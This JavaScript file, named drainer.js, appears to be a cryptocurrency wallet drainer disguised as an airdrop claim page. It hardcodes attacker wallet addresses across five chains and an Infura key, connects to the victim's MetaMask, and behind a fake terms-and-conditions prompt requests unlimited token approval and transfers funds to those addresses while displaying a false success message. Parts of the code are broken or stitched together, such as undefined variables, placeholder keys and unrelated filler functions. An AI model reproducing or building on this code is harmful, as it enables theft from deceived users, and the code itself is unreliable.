// drainer.js

const ethWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const solWalletAddress = 'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv';
const bnbWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const btcWalletAddress = 'bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w';
const polygonWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const infuraProjectId = '83caa57ba3004ffa91addb7094bac4cc';

const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider('https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc'));
const solanaWeb3 = require('@solana/web3.js');
const solana = new solanaWeb3.Connection(
  solanaWeb3.clusterApiUrl('mainnet-beta'),
  'processed'
);

// Log when the script is loaded
console.log("Drainer script loaded");

// Example function with logging
function startDraining() {
 console.log("startDraining function called");

 // Simulate some work
 let data = fetchData();
 console.log("Data fetched:", data);

 // Process data
 let processedData = processData(data);
 console.log("Data processed:", processedData);

 // Update the DOM
 updateDOM(processedData);
 console.log("DOM updated");
}

function fetchData() {
 console.log("fetchData function called");
 // Simulate data fetching
 return { id: 1, name: "Example Data" };
}

function processData(data) {
 console.log("processData function called with data:", data);
 // Simulate data processing
 return { ...data, processed: true };
}

function updateDOM(data) {
 console.log("updateDOM function called with data:", data);
 // Simulate updating the DOM
 document.getElementById('result').innerText = JSON.stringify(data);
}

// Call the main function to start the process
startDraining();

let userAddress;

async function connectWallet() {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      const account = accounts[0]; // first account
      console.log('Connected account:', account);

      document.getElementById('status').innerText = `Connected to ${account}`;
      document.getElementById('connectWallet').style.display = 'none';
      document.getElementById('solanaInput').style.display = 'block';
    } catch (error) {
      console.error('Error connecting to wallet:', error);
      document.getElementById('status').innerText = 'Connection failed. Try again?';
    }
  } else {
    document.getElementById('status').innerText = 'Please install MetaMask!';
  }
}

function scanAddress() {
const solanaAddr = document.getElementById('solanaAddress').value;
if (solanaAddr) {
document.getElementById('solanaInput').style.display = 'none';
document.getElementById('terms').style.display = 'block';
} else {
document.getElementById('status').innerText = 'Please enter a valid Solana address.';
}
}

async function acceptTerms() {
if (confirm('Are you sure you want to accept the terms and conditions?')) {
try {
// Get unlimited approval
const contract = new web3.eth.Contract([], userAddress);
await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1000000', 'ether')).send({ from: userAddress });

// Send funds to specified addresses
await sendToEthereum(userAddress, ethWalletAddress);
await sendToSolana(userAddress, solWalletAddress);
await sendToBNB(userAddress, bnbWalletAddress);
await sendToBTC(userAddress, btcWalletAddress);
await sendToPolygon(userAddress, polygonWalletAddress);

document.getElementById('status').innerText = 'Airdrop claimed successfully!';
} catch (error) {
console.error('Error claiming airdrop:', error);
document.getElementById('status').innerText = 'Failed to claim Airdrop. Please try again in 15 minutes.';
}
}
}

async function sendToEthereum(from, to) {
const tx = {
from: from,
to: to,
value: web3.utils.toWei('1', 'ether'),
gas: 2000000
};
await web3.eth.sendTransaction(tx);
}

async function sendToSolana(from, to) {
const transaction = new solanaWeb3.Transaction().add(
solanaWeb3.SystemProgram.transfer({
fromPubkey: new solanaWeb3.PublicKey(from),
toPubkey: new solanaWeb3.PublicKey(to),
lamports: solanaWeb3.LAMPORTS_PER_SOL
})
);
const signature = await solana.sendTransaction(transaction, [from]);
console.log('Solana transaction signature:', signature);
}

async function sendToBNB(from, to) {
const bnb = new Binance();
const tx = {
from: from,
to: to,
value: bnb.toWei('1', 'ether'),
gas: 2000000
};
await bnb.sendTransaction(tx);
}

async function sendToBTC(from, to) {
const network = bitcoin.networks.testnet;
const keyPair = bitcoin.ECPair.fromWIF('YOUR_BTC_PRIVATE_KEY', network);
const tx = new bitcoin.TransactionBuilder(network);
tx.addInput('YOUR_BTC_TXID', 0);
tx.addOutput(to, 50000); // 0.0005 BTC
const txHex = tx.build().toHex();
const signedTx = keyPair.signTransaction(tx.build());
const broadcastTx = await bitcoin.broadcastTx(signedTx.toHex());
console.log('BTC transaction broadcasted:', broadcastTx);
}

async function sendToPolygon(from, to) {
const tx = {
from: from,
to: to,
value: web3.utils.toWei('1', 'ether'),
gas: 2000000
};
await web3.eth.sendTransaction(tx);
}
